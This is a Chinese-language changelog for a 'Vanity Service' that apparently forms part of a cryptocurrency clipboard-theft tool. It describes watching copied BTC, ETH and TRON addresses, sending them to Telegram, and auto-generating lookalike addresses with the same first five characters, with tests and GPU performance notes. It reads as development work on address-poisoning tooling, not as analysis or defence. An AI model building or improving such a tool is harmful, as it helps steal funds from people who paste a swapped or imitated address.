# Vanity Service 前缀匹配更新说明

## 更新内容

### 1. 匹配规则改为前5位
- **TRON地址**：匹配 T + 后面4位字符（如 `T1234`）
- **BTC地址**：
  - P2PKH（1开头）：匹配前5位（如 `1A1zP`）
  - P2SH（3开头）：匹配前5位（如 `3J98t`）
  - Bech32（bc1开头）：匹配前5位（如 `bc1qw`）
- **ETH地址**：匹配 0x + 后面3位字符（如 `0x742`）

### 2. 移除Solana支持
- Vanity service 不再检测和生成 Solana 地址
- 主程序收到 Solana 地址时：
  - 仍然会发送到 Telegram 通知
  - 但不会触发自动生成相似地址

### 3. 技术实现
- 修改了 `vanity_generator.py` 中的地址检测和模式提取逻辑
- 修改了 `vanitygen_plusplus.py` 中的生成函数：
  - BTC/TRX/ETH 都改为使用前缀匹配
  - 移除了后缀过滤逻辑
- 服务端在自动生成时增加了地址类型检查

## 测试方法

1. 复制各种类型的加密货币地址：
   - BTC: `1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa`
   - ETH: `0x742d35Cc6634C0532925a3b844Bc9e7595f3d5a7`
   - TRON: `TJCnKsPa7y5okkXvQAidZBzqx3QyQ6sxMW`
   - Solana: `9WzDXwBbmkg8ZTbNMqUxvQRAyrZzDsGYdLVL9zYtAWWM`

2. 预期结果：
   - BTC/ETH/TRON 地址会生成前5位相同的地址
   - Solana 地址只会发送通知，不会生成相似地址

## 性能影响
- 前5位匹配比前2后3模式更容易生成
- 生成速度会更快
- GPU加速效果更明显
